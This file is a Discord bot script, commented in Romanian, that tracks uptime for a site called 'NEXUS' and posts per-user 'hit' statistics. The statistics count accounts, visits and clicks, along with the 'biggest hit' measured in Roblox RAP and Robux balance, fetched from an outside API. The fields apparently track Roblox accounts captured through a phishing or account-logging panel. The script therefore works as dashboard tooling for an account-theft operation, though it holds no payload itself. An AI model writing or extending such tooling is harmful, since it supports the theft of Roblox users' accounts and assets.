// 1️⃣ Importuri
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fetch = require('node-fetch');
const express = require('express');

// 2️⃣ Server Express pentru keep-alive
const app = express();
const PORT = process.env.PORT || 3000;
app.get("/", (req, res) => res.send("Bot is alive ✅"));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// 3️⃣ Creezi clientul Discord
const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds, 
    GatewayIntentBits.GuildMessages, 
    GatewayIntentBits.MessageContent
  ] 
});

const TOKEN = process.env.DISCORD_BOT_TOKEN;

// 4️⃣ Funcții utile
function formatNumber(num) { return num?.toLocaleString() || "0"; }
function formatDuration(ms) {
  let sec = Math.floor(ms / 1000);
  let min = Math.floor(sec / 60);
  let hr = Math.floor(min / 60);
  sec %= 60; min %= 60;
  return `${hr}h ${min}m ${sec}s`;
}

// 5️⃣ Config Uptime Monitor
let lastUpTime = null;
let lastStatus = null;
const STATUS_CHANNEL_ID = "1437904935059722381";
const MAIN_SITE_URL = "https://www.logged.tg/auth/nexus";
const MAIN_SITE_NAME = "NEXUS";

// 5.1️⃣ Monitor site la fiecare 30 secunde
setInterval(async () => {
  try {
    const start = Date.now();
    let res, ping;
    try { 
      const response = await fetch(MAIN_SITE_URL); 
      res = { ok: response.ok }; 
      ping = Date.now() - start; 
    } catch { 
      res = { ok: false }; 
      ping = null; 
    }

    let currentStatus = res.ok ? "UP" : "DOWN";
    if (res.ok && !lastUpTime) lastUpTime = Date.now();
    if (!res.ok) lastUpTime = null;

    if (currentStatus !== lastStatus) {
      const channel = client.channels.cache.get(STATUS_CHANNEL_ID);
      if (channel) {
        const embed = new EmbedBuilder()
          .setColor(0x000000)
          .setThumbnail("") // gol
          .setDescription(
            `-- **NEXUS BOT** --\n\n` +
            `**${MAIN_SITE_NAME}**\n` +
            `STATUS: ${currentStatus}\n` +
            `Response Time: ${ping ? ping + "ms" : "N/A"}`
          )
          .setImage("https://i.imgur.com/qxSArud.gif")
          .setFooter({ text: "Site Uptime Monitor" });

        const statusMsg = currentStatus === "UP" 
          ? "✅ The site is back **UP**!" 
          : "⚠️ The site is **DOWN**!";
        
        await channel.send({ content: statusMsg, embeds: [embed] });
      }
      lastStatus = currentStatus;
    }

  } catch (err) { console.error("Error checking site:", err); }
}, 30000);

// 6️⃣ Event listener pentru mesaje
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  let args = message.content.split(" ").slice(1);
  let targetUser;
  if (args[0]) {
    try { targetUser = await client.users.fetch(args[0]); } 
    catch { targetUser = message.mentions.users.first() || message.author; }
  } else { targetUser = message.mentions.users.first() || message.author; }
  const targetId = targetUser.id;

  // ===== !stats =====
  if (message.content.startsWith('!stats')) {
    try {
      const res = await fetch(`https://api.injuries.lu/v1/public/user?userId=${targetId}`);
      const data = await res.json();
      if (!data.success || !data.Normal) return message.reply("❌ No stats found for this user.");

      const normal = data.Normal;
      const profile = data.Profile || {};
      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0x800080)
        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
        .setDescription(`-- **NEXUS BOT** --\n\n**User:** ${userName}\n\n**TOTAL STATS:**\nHits: ${formatNumber(normal.Totals?.Accounts)}\nVisits: ${formatNumber(normal.Totals?.Visits)}\nClicks: ${formatNumber(normal.Totals?.Clicks)}\n\n**BIGGEST HIT:**\nSummary: ${formatNumber(normal.Highest?.Summary)}\nRAP: ${formatNumber(normal.Highest?.Rap)}\nRobux: ${formatNumber(normal.Highest?.Balance)}\n\n**TOTAL HIT STATS:**\nSummary: ${formatNumber(normal.Totals?.Summary)}\nRAP: ${formatNumber(normal.Totals?.Rap)}\nRobux: ${formatNumber(normal.Totals?.Balance)}`)
        .setImage("https://i.imgur.com/qxSArud.gif")
        .setFooter({ text: "NEXUS Stats Bot" });

      await message.channel.send({ embeds: [embed] });
    } catch (err) {
      console.error('Error fetching stats:', err);
      message.reply("❌ Error fetching stats. Please try again later.");
    }
  }

  // ===== !daily =====
  if (message.content.startsWith('!daily')) {
    try {
      const res = await fetch(`https://api.injuries.lu/v2/daily?type=0x2&cs=3&ref=nexus&userId=${targetId}`);
      const data = await res.json();
      if (!data.success) return message.reply("❌ No daily stats available.");

      const daily = data.Daily || data.Normal;
      const profile = data.Profile || {};
      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0x800080)
        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
        .setDescription(`-- **NEXUS BOT** --\n\n**User:** ${userName}\n\n**DAILY STATS:**\nHits: ${formatNumber(daily.Totals?.Accounts)}\nVisits: ${formatNumber(daily.Totals?.Visits)}\nClicks: ${formatNumber(daily.Totals?.Clicks)}\n\n**BIGGEST HIT:**\nSummary: ${formatNumber(daily.Highest?.Summary)}\nRAP: ${formatNumber(daily.Highest?.Rap)}\nRobux: ${formatNumber(daily.Highest?.Balance)}\n\n**TOTAL HIT STATS:**\nSummary: ${formatNumber(daily.Totals?.Summary)}\nRAP: ${formatNumber(daily.Totals?.Rap)}\nRobux: ${formatNumber(daily.Totals?.Balance)}`)
        .setImage("https://i.imgur.com/qxSArud.gif")
        .setFooter({ text: "NEXUS Daily Stats" });

      await message.channel.send({ embeds: [embed] });
    } catch (err) {
      console.error('Error fetching daily stats:', err);
      message.reply("❌ Error fetching daily stats. Please try again later.");
    }
  }

  // ===== !check =====
  if (message.content.startsWith('!check')) {
    try {
      const start = Date.now();
      let res, ping;
      try { const response = await fetch(MAIN_SITE_URL); res = { ok: response.ok }; ping = Date.now() - start; } 
      catch { res = { ok: false }; ping = null; }

      let statusText = res.ok ? "ONLINE" : "OFFLINE";
      let uptimeText = res.ok && lastUpTime ? `UP for ${formatDuration(Date.now() - lastUpTime)}` : "❌ No uptime data";

      const embed = new EmbedBuilder()
        .setColor(0x000000)
        .setThumbnail("") // gol
        .setDescription(`-- **NEXUS BOT** --\n\n**${MAIN_SITE_NAME}**\nSTATUS: ${statusText}\nUPTIME: ${uptimeText}\nResponse Time: ${ping ? ping + "ms" : "N/A"}`)
        .setImage("https://i.imgur.com/qxSArud.gif")
        .setFooter({ text: "NEXUS Site Monitor" });

      const channel = client.channels.cache.get(STATUS_CHANNEL_ID);
      if(channel) await channel.send({ embeds: [embed] });

    } catch (err) {
      console.error(err);
    }
  }
});

// 7️⃣ Error handler
client.on('error', (error) => console.error('Discord client error:', error));

// 8️⃣ Login bot
if (!TOKEN) { console.error('❌ DISCORD_BOT_TOKEN is not set!'); process.exit(1); }
client.login(TOKEN);
